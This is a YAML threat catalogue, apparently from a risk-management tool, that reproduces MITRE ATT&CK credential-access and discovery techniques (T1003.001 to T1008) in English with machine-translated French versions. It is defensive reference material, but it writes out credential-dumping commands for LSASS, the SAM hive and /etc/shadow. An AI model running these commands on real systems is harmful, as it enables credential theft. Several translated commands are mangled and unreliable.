          \nLocalement, le mimikatz peut \xEAtre ex\xE9cut\xE9 en utilisant :\n\n\
          * <code>sekurlsa ::Minidump lsassdump.dmp</code>\n* <code>sekurlsa\_::logonMots\
          \ de passe</code>\n\nDes outils Windows int\xE9gr\xE9s tels que \xAB comsvcs.dll\
          \ \xBB peuvent \xE9galement \xEAtre utilis\xE9s :\n\n* <code>rundll32.exe\
          \ C\_:\\Windows\\System32\\comsvcs.dll PID MiniDump lsass.dmp complet</code>\
          \ (Citation : Volexity Exchange Marauder mars 2021)(Citation : Symantec\
          \ attaque le secteur gouvernemental)\n\nSimilaire \xE0 [Image File Execution\
          \ Options Injection](https://attack.mitre.org/techniques/T1546/012), le\
          \ m\xE9canisme de sortie silencieuse du processus peut \xEAtre abus\xE9\
          \ pour cr\xE9er un vidage m\xE9moire de \xAB lsass.exe \xBB via Windows\
          \ Error Reporting ('WerFault.exe'). (Citation : LSASS Deep Instinct)\n\n\
          Les DLL du Fournisseur de Soutien de S\xE9curit\xE9 Windows (SSP) sont charg\xE9\
          es dans le processus LSASS au d\xE9marrage du syst\xE8me. Une fois charg\xE9\
          s dans le LSA, les DLL SSP ont acc\xE8s \xE0 des mots de passe chiffr\xE9\
          s et en clair stock\xE9s sous Windows, tels que le mot de passe de domaine\
          \ ou les codes PIN de carte \xE0 puce de tout utilisateur connect\xE9. La\
          \ configuration SSP est stock\xE9e dans deux cl\xE9s de registre : <code>HKLM\\\
          SYSTEM\\CurrentControlSet\\Control\\Control\\Lsa\\Security Packages</code>\
          \ et <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security\
          \ Packages</code>. Un adversaire peut modifier ces cl\xE9s de registre pour\
          \ ajouter de nouveaux SSP, qui seront charg\xE9s au prochain d\xE9marrage\
          \ du syst\xE8me, ou lorsque la fonction API Windows AddSecurityPackage sera\
          \ appel\xE9e. (Citation : Graeber 2014)\n\nLes SSP suivants peuvent \xEA\
          tre utilis\xE9s pour acc\xE9der aux identifiants :\n\n* Msv : Les connexions\
          \ interactives, les logons batch et les logons de service sont effectu\xE9\
          s via le package d\u2019authentification MSV.\n* Wdigest : Le protocole\
          \ d\u2019authentification Digest est con\xE7u pour \xEAtre utilis\xE9 avec\
          \ les \xE9changes Hypertext Transfer Protocol (HTTP) et Simple Authentication\
          \ Security Layer (SASL). (Citation : TechNet Blogs Protection des Accr\xE9\
          ditations)\n* Kerberos : Pr\xE9f\xE9r\xE9 pour l\u2019authentification mutuelle\
          \ client-serveur dans Windows 2000 et versions ult\xE9rieures.\n* CredSSP\
          \ : Fournit l\u2019authentification SSO et r\xE9seau pour les services de\
          \ bureau distant. (Citation : TechNet Blogs Protection des Accr\xE9ditations)\n\
          https://attack.mitre.org/techniques/T1003/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.002
    ref_id: T1003.002
    name: Security Account Manager
    description: "Adversaries may attempt to extract credential material from the\
      \ Security Account Manager (SAM) database either through in-memory techniques\
      \ or through the Windows Registry where the SAM database is stored. The SAM\
      \ is a database file that contains local accounts for the host, typically those\
      \ found with the <code>net user</code> command. Enumerating the SAM database\
      \ requires SYSTEM level access.\n\nA number of tools can be used to retrieve\
      \ the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n\
      * [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\n\
      Alternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg\
      \ save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\n\
      Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation:\
      \ GitHub Creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n\
      * RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n\
      https://attack.mitre.org/techniques/T1003/002"
    translations:
      fr:
        name: "Gestionnaire de compte de s\xE9curit\xE9"
        description: "Les adversaires peuvent tenter d\u2019extraire du mat\xE9riel\
          \ d\u2019accr\xE9ditation de la base de donn\xE9es du Gestionnaire de Comptes\
          \ de S\xE9curit\xE9 (SAM) soit via des techniques en m\xE9moire, soit via\
          \ le Registre Windows o\xF9 la base de donn\xE9es SAM est stock\xE9e. Le\
          \ SAM est un fichier de base de donn\xE9es contenant des comptes locaux\
          \ pour l\u2019h\xF4te, g\xE9n\xE9ralement ceux trouv\xE9s avec la commande\
          \ <code>utilisateur net</code>. L\u2019\xE9num\xE9ration de la base de donn\xE9\
          es SAM n\xE9cessite un acc\xE8s au niveau SYST\xC8ME.\n\nPlusieurs outils\
          \ peuvent \xEAtre utilis\xE9s pour r\xE9cup\xE9rer le fichier SAM via des\
          \ techniques en m\xE9moire :\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n\
          * [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\
          \nSinon, le SAM peut \xEAtre extrait du registre avec le registre :\n\n\
          * <code>reg sauve HKLM\\sam Sam</code>\n* <code>enregistrer HKLM\\syst\xE8\
          me</code>\n\nCreddump7 peut ensuite \xEAtre utilis\xE9 pour traiter localement\
          \ la base de donn\xE9es SAM afin de r\xE9cup\xE9rer les hachages. (Citation\
          \ : GitHub Creddump7)\n\nNotes : \n\n* Le compte RID 500 est l\u2019administrateur\
          \ local int\xE9gr\xE9.\n* RID 501 est le compte invit\xE9.\n* Les comptes\
          \ utilisateurs commencent avec un RID de 1 000+.\nhttps://attack.mitre.org/techniques/T1003/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.003
    ref_id: T1003.003
    name: NTDS
    description: 'Adversaries may attempt to access or create a copy of the Active
      Directory domain database in order to steal credential information, as well
      as obtain other information about domain members such as devices, users, and
      access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code>
      of a domain controller.(Citation: Wikipedia Active Directory)


      In addition to looking for NTDS files on active Domain Controllers, adversaries
      may search for backups that contain the same or similar information.(Citation:
      Metcalf 2015)


      The following tools and techniques can be used to enumerate the NTDS file and
      the contents of the entire Active Directory hashes.


      * Volume Shadow Copy

      * secretsdump.py

      * Using the in-built Windows tool, ntdsutil.exe

      * Invoke-NinjaCopy

      https://attack.mitre.org/techniques/T1003/003'
    translations:
      fr:
        name: NTDS
        description: "Les adversaires peuvent tenter d\u2019acc\xE9der ou de cr\xE9\
          er une copie de la base de donn\xE9es du domaine Active Directory afin de\
          \ voler des informations sur les identifiants, ainsi que d\u2019obtenir\
          \ d\u2019autres informations sur les membres du domaine tels que les appareils,\
          \ les utilisateurs et les droits d\u2019acc\xE8s. Par d\xE9faut, le fichier\
          \ NTDS (NTDS.dit) se trouve dans <code>%SystemRoot\_%\\NTDS\\Ntds.dit</code>\
          \ d\u2019un contr\xF4leur de domaine. (Citation : Wikip\xE9dia Active Directory)\n\
          \nEn plus de rechercher des fichiers NTDS sur des contr\xF4leurs de domaine\
          \ actifs, les adversaires peuvent rechercher des sauvegardes contenant les\
          \ m\xEAmes informations ou des informations similaires. (Citation : Metcalf\
          \ 2015)\n\nLes outils et techniques suivants peuvent \xEAtre utilis\xE9\
          s pour \xE9num\xE9rer le fichier NTDS ainsi que le contenu de l\u2019ensemble\
          \ des hachages d\u2019Active Directory.\n\n* Copie Ombre du Volume\n* secretsdump.py\n\
          * En utilisant l\u2019outil Windows int\xE9gr\xE9, ntdsutil.exe\n* Invoke-NinjaCopy\n\
          https://attack.mitre.org/techniques/T1003/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.004
    ref_id: T1003.004
    name: LSA Secrets
    description: 'Adversaries with SYSTEM access to a host may attempt to access Local
      Security Authority (LSA) secrets, which can contain a variety of different credential
      materials, such as credentials for service accounts.(Citation: Passcape LSA
      Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows
      Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>.
      LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)


      [Reg](https://attack.mitre.org/software/S0075) can be used to extract from the
      Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to
      extract secrets from memory.(Citation: ired Dumping LSA Secrets)

      https://attack.mitre.org/techniques/T1003/004'
    translations:
      fr:
        name: LSA Secrets
        description: "Les adversaires ayant acc\xE8s au SYST\xC8ME \xE0 un h\xF4te\
          \ peuvent tenter d\u2019acc\xE9der aux secrets de la Local Security Authority\
          \ (LSA), qui peuvent contenir divers documents d\u2019accr\xE9ditation,\
          \ tels que des identifiants pour des comptes de service. (Citation : Secrets\
          \ LSA de Passcape)(Citation : Mod\xE8le de niveau d\u2019administration\
          \ Microsoft AD)(Citation : Identifiants Windows Tilbury) Les secrets LSA\
          \ sont stock\xE9s dans le registre \xE0 <code>HKEY_LOCAL_MACHINE\\S\xC9\
          CURIT\xC9\\Politique\\Secrets</code>. Les secrets LSA peuvent aussi \xEA\
          tre extraits de m\xE9moire. (Citation : ired Dumping LSA Secrets)\n\n[Reg](https://attack.mitre.org/software/S0075)\
          \ peut \xEAtre utilis\xE9 pour extraire du Registre. [Mimikatz](https://attack.mitre.org/software/S0002)\
          \ peut \xEAtre utilis\xE9 pour extraire des secrets de la m\xE9moire. (Citation\
          \ : ired Dumping LSA Secrets)\nhttps://attack.mitre.org/techniques/T1003/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.005
    ref_id: T1003.005
    name: Cached Domain Credentials
    description: "Adversaries may attempt to access cached domain credentials used\
      \ to allow authentication to occur in the event a domain controller is unavailable.(Citation:\
      \ Microsoft - Cached Creds)\n\nOn Windows Vista and newer, the hash format is\
      \ DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2\
      \ hash.(Citation: PassLib mscache) The number of default cached credentials\
      \ varies and can be altered per system. This hash does not allow pass-the-hash\
      \ style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002)\
      \ to recover the plaintext password.(Citation: ired mscache)\n\nOn Linux systems,\
      \ Active Directory credentials can be accessed through caches maintained by\
      \ software like System Security Services Daemon (SSSD) or Quest Authentication\
      \ Services (formerly VAS). Cached credential hashes are typically located at\
      \ `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb`\
      \ for Quest. Adversaries can use utilities, such as `tdbdump`, on these database\
      \ files to dump the cached hashes and use [Password Cracking](https://attack.mitre.org/techniques/T1110/002)\
      \ to obtain the plaintext password.(Citation: Brining MimiKatz to Unix) \n\n\
      With SYSTEM or sudo access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002),\
      \ [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py for Windows\
      \ or Linikatz for Linux can be used to extract the cached credentials.(Citation:\
      \ Brining MimiKatz to Unix)\n\nNote: Cached credentials for Windows Vista are\
      \ derived using PBKDF2.(Citation: PassLib mscache)\nhttps://attack.mitre.org/techniques/T1003/005"
    translations:
      fr:
        name: Identifiants de domaine mis en cache
        description: "Les adversaires peuvent tenter d\u2019acc\xE9der aux identifiants\
          \ de domaine mis en cache utilis\xE9s pour permettre l\u2019authentification\
          \ en cas de manque de contr\xF4leur de domaine. (Citation : Microsoft -\
          \ Identifiants en cache)\n\nSous Windows Vista et versions ult\xE9rieures,\
          \ le format de hachage est DCC2 (Domain Cached Credentials version 2), \xE9\
          galement appel\xE9 hachage MS-Cache v2. (Citation : PassLib mscache) Le\
          \ nombre d\u2019identifiants mis en cache par d\xE9faut varie et peut \xEA\
          tre modifi\xE9 selon le syst\xE8me. Ce hachage ne permet pas d\u2019attaques\
          \ de type \xAB pass-the-hash \xBB, et n\xE9cessite \xE0 la place [Password\
          \ Cracking](https://attack.mitre.org/techniques/T1110/002) pour r\xE9cup\xE9\
          rer le mot de passe en clair. (Citation : ired mscache)\n\nSur les syst\xE8\
          mes Linux, les identifiants Active Directory peuvent \xEAtre consult\xE9\
          s via des caches maintenus par des logiciels tels que System Security Services\
          \ Daemon (SSSD) ou Quest Authentication Services (anciennement VAS). Les\
          \ hachages de cr\xE9dents mis en cache se trouvent g\xE9n\xE9ralement sur\
          \ '/var/lib/sss/db/cache. [domain].ldb' pour SSSD ou '/var/opt/quest/vas/authcache/vas_auth.vdb'\
          \ pour Quest. Les adversaires peuvent utiliser des utilitaires, tels que\
          \ \xAB tdbdump \xBB, sur ces fichiers de base de donn\xE9es pour vider les\
          \ hachages mis en cache et utiliser [Password Cracking](https://attack.mitre.org/techniques/T1110/002)\
          \ pour obtenir le mot de passe en clair. (Citation : Apporter MimiKatz \xE0\
          \ Unix) \n\nAvec l\u2019acc\xE8s SYSTEM ou sudo, les outils/utilitaires\
          \ tels que [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075),\
          \ et secretsdump.py pour Windows ou Linikatz pour Linux peuvent \xEAtre\
          \ utilis\xE9s pour extraire les identifiants mis en cache. (Citation : Apporter\
          \ MimiKatz \xE0 Unix)\n\nNote : Les identifiants mis en cache pour Windows\
          \ Vista sont d\xE9riv\xE9s \xE0 l\u2019aide de PBKDF2. (Citation : PassLib\
          \ mscache)\nhttps://attack.mitre.org/techniques/T1003/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.006
    ref_id: T1003.006
    name: DCSync
    description: 'Adversaries may attempt to access credentials and other sensitive
      information by abusing a Windows Domain Controller''s application programming
      interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges)
      (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication
      process from a remote domain controller using a technique called DCSync.


      Members of the Administrators, Domain Admins, and Enterprise Admin groups or
      computer accounts on the domain controller are able to run DCSync to pull password
      data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may
      include current and historical hashes of potentially useful accounts such as
      KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden
      Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the
      Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz
      and DCSync) or change an account''s password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation:
      InsiderThreat ChangeNTLM July 2017)


      DCSync functionality has been included in the "lsadump" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation:
      GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs
      DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)

      https://attack.mitre.org/techniques/T1003/006'
    translations:
      fr:
        name: DCSync
        description: "Les adversaires peuvent tenter d\u2019acc\xE9der \xE0 des identifiants\
          \ et \xE0 d\u2019autres informations sensibles en abusant de l\u2019interface\
          \ de programmation d\u2019applications (API) d\u2019un contr\xF4leur de\
          \ domaine Windows(Citation : Microsoft DRSR d\xE9c. 2017) (Citation : Microsoft\
          \ GetNCCChanges) (Citation : Samba DRSUAPI) (Citation : Wine API samlib.dll)\
          \ pour simuler le processus de r\xE9plication depuis un contr\xF4leur de\
          \ domaine distant \xE0 l\u2019aide d\u2019une technique appel\xE9e DCSync.\n\
          \nLes membres des groupes Administrateurs, Administrateurs de Domaine et\
          \ Administrateurs d\u2019entreprise ou des comptes informatiques sur le\
          \ contr\xF4leur de domaine peuvent ex\xE9cuter DCSync pour extraire les\
          \ donn\xE9es de mot de passe (Citation : ADSecurity Mimikatz DCSync) depuis\
          \ Active Directory, ce qui peut inclure des hachages actuels et historiques\
          \ de comptes potentiellement utiles tels que KRBTGT et Administrators. Les\
          \ hachages peuvent ensuite \xEAtre utilis\xE9s pour cr\xE9er un [Golden\
          \ Ticket](https://attack.mitre.org/techniques/T1558/001) \xE0 utiliser dans\
          \ [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation\
          \ : Harmj0y Mimikatz et DCSync) ou changer le mot de passe d\u2019un compte\
          \ comme indiqu\xE9 dans [Manipulation du compte](https://attack.mitre.org/techniques/T1098).\
          \ (Citation : InsiderThreat ChangeNTLM juillet 2017)\n\nLa fonctionnalit\xE9\
          \ de DCSync a \xE9t\xE9 incluse dans le module \xAB lsadump \xBB dans [Mimikatz](https://attack.mitre.org/software/S0002).\
          \ (Citation : module GitHub Mimikatz Isadump) Lsadump inclut \xE9galement\
          \ NetSync, qui ex\xE9cute DCSync sur un protocole de r\xE9plication h\xE9\
          rit\xE9. (Citation : Microsoft NRPC d\xE9c. 2017)\nhttps://attack.mitre.org/techniques/T1003/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.007
    ref_id: T1003.007
    name: Proc Filesystem
    description: "Adversaries may gather credentials from the proc filesystem or `/proc`.\
      \ The proc filesystem is a pseudo-filesystem used as an interface to kernel\
      \ data structures for Linux based systems managing virtual memory. For each\
      \ process, the `/proc/<PID>/maps` file shows how memory is mapped within the\
      \ process\u2019s virtual address space. And `/proc/<PID>/mem`, exposed for debugging\
      \ purposes, provides access to the process\u2019s virtual address space.(Citation:\
      \ Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)\n\nWhen\
      \ executing with root privileges, adversaries can search these memory locations\
      \ for all processes on a system that contain patterns indicative of credentials.\
      \ Adversaries may use regex patterns, such as <code>grep -E \"^[0-9a-f-]* r\"\
      \ /proc/\"$pid\"/maps | cut -d' ' -f 1</code>, to look for fixed strings in\
      \ memory structures or cached hashes.(Citation: atomic-red proc file system)\
      \ When running without privileged access, processes can still view their own\
      \ virtual memory locations. Some services or programs may save credentials in\
      \ clear text inside the process\u2019s memory.(Citation: MimiPenguin GitHub\
      \ May 2017)(Citation: Polop Linux PrivEsc Gitbook)\n\nIf running as or with\
      \ the permissions of a web browser, a process can search the `/maps` & `/mem`\
      \ locations for common website credential patterns (that can also be used to\
      \ find adjacent memory within the same structure) in which hashes or cleartext\
      \ credentials may be located.\nhttps://attack.mitre.org/techniques/T1003/007"
    translations:
      fr:
        name: "Syst\xE8me de fichiers Proc"
        description: "Les adversaires peuvent obtenir des identifiants \xE0 partir\
          \ du syst\xE8me de fichiers de proc ou de \xAB /proc \xBB. Le syst\xE8me\
          \ de fichiers proc est un pseudo-syst\xE8me de fichiers utilis\xE9 comme\
          \ interface pour les structures de donn\xE9es du noyau pour les syst\xE8\
          mes Linux g\xE9rant la m\xE9moire virtuelle. Pour chaque processus, le fichier\
          \ '/proc/<PID>/maps' montre comment la m\xE9moire est mapp\xE9e dans l\u2019\
          espace d\u2019adressage virtuel du processus. Et '/proc/<PID>/mem', expos\xE9\
          \ \xE0 des fins de d\xE9bogage, donne acc\xE8s \xE0 l\u2019espace d\u2019\
          adressage virtuel du processus.( Citation : Picus Labs Proc cump 2022) (Citation\
          \ : baeldung Linux proc map 2022)\n\nLors de l\u2019ex\xE9cution avec des\
          \ privil\xE8ges root, les adversaires peuvent rechercher dans ces emplacements\
          \ m\xE9moire tous les processus d\u2019un syst\xE8me contenant des motifs\
          \ indiquant des identifiants. Les adversaires peuvent utiliser des motifs\
          \ r\xE9guliers, tels que <code>grep -E \xAB ^[0-9a-f-]* r \xBB /proc/\"\
          $pid\"/maps | cut -d'' -f 1</code>, pour rechercher des cha\xEEnes fixes\
          \ dans les structures m\xE9moire ou les hachages mis en cache. (Citation\
          \ : syst\xE8me de fichiers proc atomique-rouge) Lorsqu\u2019ils fonctionnent\
          \ sans acc\xE8s privil\xE9gi\xE9, les processus peuvent toujours consulter\
          \ leurs propres emplacements de m\xE9moire virtuelle. Certains services\
          \ ou programmes peuvent enregistrer des identifiants en texte clair dans\
          \ la m\xE9moire du processus. (Citation : MimiPenguin GitHub mai 2017)(Citation\
          \ : Polop Linux PrivEsc Gitbook)\n\nS\u2019il fonctionne sous ou avec les\
          \ permissions d\u2019un navigateur web, un processus peut rechercher dans\
          \ les emplacements '/maps' & '/mem' des motifs d\u2019identifiants courants\
          \ de sites web (qui peuvent \xE9galement \xEAtre utilis\xE9s pour trouver\
          \ la m\xE9moire adjacente dans la m\xEAme structure) dans lesquels des hachages\
          \ ou des identifiants en clair peuvent \xEAtre trouv\xE9s.\nhttps://attack.mitre.org/techniques/T1003/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.008
    ref_id: T1003.008
    name: /etc/passwd and /etc/shadow
    description: 'Adversaries may attempt to dump the contents of <code>/etc/passwd</code>
      and <code>/etc/shadow</code> to enable offline password cracking. Most modern
      Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code>
      to store user account information, including password hashes in <code>/etc/shadow</code>.
      By default, <code>/etc/shadow</code> is only readable by the root user.(Citation:
      Linux Password and Shadow File Formats)


      Linux stores user information such as user ID, group ID, home directory path,
      and login shell in <code>/etc/passwd</code>. A "user" on the system may belong
      to a person or a service. All password hashes are stored in <code>/etc/shadow</code>
      - including entries for users with no passwords and users with locked or disabled
      accounts.(Citation: Linux Password and Shadow File Formats)


      Adversaries may attempt to read or dump the <code>/etc/passwd</code> and <code>/etc/shadow</code>
      files on Linux systems via command line utilities such as the <code>cat</code>
      command.(Citation: Arctic Wolf) Additionally, the Linux utility <code>unshadow</code>
      can be used to combine the two files in a format suited for password cracking
      utilities such as John the Ripper - for example, via the command <code>/usr/bin/unshadow
      /etc/passwd /etc/shadow > /tmp/crack.password.db</code>(Citation: nixCraft -
      John the Ripper). Since the user information stored in <code>/etc/passwd</code>
      are linked to the password hashes in <code>/etc/shadow</code>, an adversary
      would need to have access to both.

      https://attack.mitre.org/techniques/T1003/008'
    translations:
      fr:
        name: /etc/passwd et /etc/shadow
        description: "Les adversaires peuvent tenter de supprimer le contenu de <code>/etc/passwd</code>\
          \ et <code>/etc/shadow</code> pour activer le craquement des mots de passe\
          \ hors ligne. La plupart des syst\xE8mes d\u2019exploitation Linux modernes\
          \ utilisent une combinaison de <code>/etc/passwd</code> et <code>/etc/shadow</code>\
          \ pour stocker les informations des comptes utilisateur, y compris les hachages\
          \ de mots de passe dans <code>/etc/shadow</code>. Par d\xE9faut, <code>/etc/shadow</code>\
          \ n\u2019est lisible que par l\u2019utilisateur root. (Citation : Formats\
          \ de mots de passe Linux et fichiers fant\xF4mes)\n\nLinux stocke des informations\
          \ utilisateur telles que l\u2019identifiant utilisateur, l\u2019identifiant\
          \ de groupe, le chemin du r\xE9pertoire personnel et le shell de connexion\
          \ dans <code>/etc/passwd</code>. Un \xAB utilisateur \xBB sur le syst\xE8\
          me peut appartenir \xE0 une personne ou \xE0 un service. Tous les hachages\
          \ de mots de passe sont stock\xE9s dans <code>/etc/shadow</code> - y compris\
          \ les entr\xE9es des utilisateurs sans mot de passe et des utilisateurs\
          \ avec des comptes verrouill\xE9s ou d\xE9sactiv\xE9s. (Citation : Formats\
          \ de mots de passe Linux et fichiers fant\xF4mes)\n\nLes adversaires peuvent\
          \ tenter de lire ou de vider les <code>fichiers /etc/passwd</code> et <code>/etc/shadow</code>\
          \ sur des syst\xE8mes Linux via des utilitaires en ligne de commande comme\
          \ la commande <code>cat</code>. (Citation : Loup Arctique) De plus, l\u2019\
          utilitaire Linux <code>unshadow</code> peut \xEAtre utilis\xE9 pour combiner\
          \ les deux fichiers dans un format adapt\xE9 aux utilitaires de craquage\
          \ de mots de passe tels que John l\u2019\xC9ventreur \u2013 par exemple,\
          \ via la commande <code>/usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>(Citation\
          \ : nixCraft - John l\u2019\xC9ventreur). Puisque les informations utilisateur\
          \ stock\xE9es dans <code>/etc/passwd</code> sont li\xE9es aux hachages de\
          \ mots de passe dans <code>/etc/shadow</code>, un adversaire devrait avoir\
          \ acc\xE8s aux deux.\nhttps://attack.mitre.org/techniques/T1003/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1005
    ref_id: T1005
    name: Data from Local System
    description: 'Adversaries may search local system sources, such as file systems,
      configuration files, local databases, virtual machine files, or process memory,
      to find files of interest and sensitive data prior to Exfiltration.


      Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059),
      such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network
      Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality
      to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco)
      Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119)
      on the local system.

      https://attack.mitre.org/techniques/T1005'
    translations:
      fr:
        name: "Donn\xE9es du syst\xE8me local"
        description: "Les adversaires peuvent rechercher dans les sources locales\
          \ du syst\xE8me, telles que les syst\xE8mes de fichiers, les fichiers de\
          \ configuration, les bases de donn\xE9es locales, les fichiers de machines\
          \ virtuelles ou la m\xE9moire de processus, afin de trouver des fichiers\
          \ d\u2019int\xE9r\xEAt et des donn\xE9es sensibles avant l\u2019Exfiltration.\n\
          \nLes adversaires peuvent le faire en utilisant un [Command and Scripting\
          \ Interpreter](https://attack.mitre.org/techniques/T1059), tel que [cmd](https://attack.mitre.org/software/S0106)\
          \ ainsi qu\u2019une [CLI de dispositif r\xE9seau](https://attack.mitre.org/techniques/T1059/008),\
          \ qui offrent la fonctionnalit\xE9 d\u2019interagir avec le syst\xE8me de\
          \ fichiers pour recueillir des informations. (Citation : show_run_config_cmd_cisco)\
          \ Les adversaires peuvent \xE9galement utiliser [Collecte automatis\xE9\
          e](https://attack.mitre.org/techniques/T1119) sur le syst\xE8me local.\n\
          https://attack.mitre.org/techniques/T1005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1006
    ref_id: T1006
    name: Direct Volume Access
    description: 'Adversaries may directly access a volume to bypass file access controls
      and file system monitoring. Windows allows programs to have direct access to
      logical volumes. Programs with direct access may read and write files directly
      from the drive by analyzing file system data structures. This technique may
      bypass Windows file access controls as well as file system monitoring tools.(Citation:
      Hakobyan 2009)


      Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation:
      Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party
      utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404))
      to create shadow copies or backups of data from system volumes.(Citation: LOLBAS
      Esentutl)

      https://attack.mitre.org/techniques/T1006'
    translations:
      fr:
        name: "Acc\xE8s direct aux volumes"
        description: "Les adversaires peuvent acc\xE9der directement \xE0 un volume\
          \ pour contourner les contr\xF4les d\u2019acc\xE8s aux fichiers et la surveillance\
          \ du syst\xE8me de fichiers. Windows permet aux programmes d\u2019avoir\
          \ un acc\xE8s direct aux volumes logiques. Les programmes ayant un acc\xE8\
          s direct peuvent lire et \xE9crire des fichiers directement depuis le disque\
          \ en analysant les structures de donn\xE9es du syst\xE8me de fichiers. Cette\
          \ technique peut contourner les contr\xF4les d\u2019acc\xE8s aux fichiers\
          \ Windows ainsi que les outils de surveillance du syst\xE8me de fichiers.\
          \ (Citation : Hakobyan 2009)\n\nDes utilitaires, tels que \xAB NinjaCopy\
          \ \xBB, existent pour effectuer ces actions dans PowerShell. (Citation :\
          \ Github PowerSploit Ninjacopy) Les adversaires peuvent \xE9galement utiliser\
          \ des utilitaires int\xE9gr\xE9s ou tiers (tels que 'vssadmin', 'wbadmin'\
          \ et [esentutl](https://attack.mitre.org/software/S0404)) pour cr\xE9er\
          \ des copies fant\xF4mes ou des sauvegardes de donn\xE9es provenant de volumes\
          \ syst\xE8me. (Citation : LOLBAS Esentutl)\nhttps://attack.mitre.org/techniques/T1006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1007
    ref_id: T1007
    name: System Service Discovery
    description: 'Adversaries may try to gather information about registered local
      system services. Adversaries may obtain information about services using tools
      as well as OS utility commands such as <code>sc query</code>, <code>tasklist
      /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.
      Adversaries may also gather information about schedule tasks via commands such
      as `schtasks` on Windows or `crontab -l` on Linux and macOS.(Citation: Elastic
      Security Labs GOSAR 2024)(Citation: SentinelLabs macOS Malware 2021)(Citation:
      Splunk Linux Gormir 2024)(Citation: Aquasec Kinsing 2020)


      Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007)
      during automated discovery to shape follow-on behaviors, including whether or
      not the adversary fully infects the target and/or attempts specific actions.'
    translations:
      fr:
        name: "D\xE9couverte des services syst\xE8me"
        description: "Les adversaires peuvent tenter de recueillir des informations\
          \ sur les services locaux enregistr\xE9s. Les adversaires peuvent obtenir\
          \ des informations sur les services \xE0 l\u2019aide d\u2019outils ainsi\
          \ que de commandes utilitaires du syst\xE8me d\u2019exploitation telles\
          \ que <code>la requ\xEAte sc</code>, <code>la liste des t\xE2ches /svc</code>,\
          \ <code>systemctl --type=service</code> et <code>net start</code>. Les adversaires\
          \ peuvent \xE9galement recueillir des informations sur les t\xE2ches de\
          \ planification via des commandes telles que \xAB schtasks \xBB sous Windows\
          \ ou \xAB crontab -l \xBB sous Linux et macOS. (Citation : Elastic Security\
          \ Labs GOSAR 2024)(Citation : SentinelLabs macOS Malware 2021)(Citation\
          \ : Splunk Linux Gormir 2024)(Citation : Aquasec Kinsing 2020)\n\nLes adversaires\
          \ peuvent utiliser les informations de [System Service Discovery](https://attack.mitre.org/techniques/T1007)\
          \ lors de la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements\
          \ suivants, y compris si l\u2019adversaire infecte compl\xE8tement la cible\
          \ et/ou tente des actions sp\xE9cifiques."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1008
    ref_id: T1008
    name: Fallback Channels
    description: 'Adversaries may use fallback or alternate communication channels
      if the primary channel is compromised or inaccessible in order to maintain reliable
      command and control and to avoid data transfer thresholds.

      https://attack.mitre.org/techniques/T1008'
    translations:
      fr:
        name: Canaux de secours
        description: "Les adversaires peuvent utiliser des canaux de rechange ou alternatifs\
          \ si le canal principal est compromis ou inaccessible afin de maintenir\
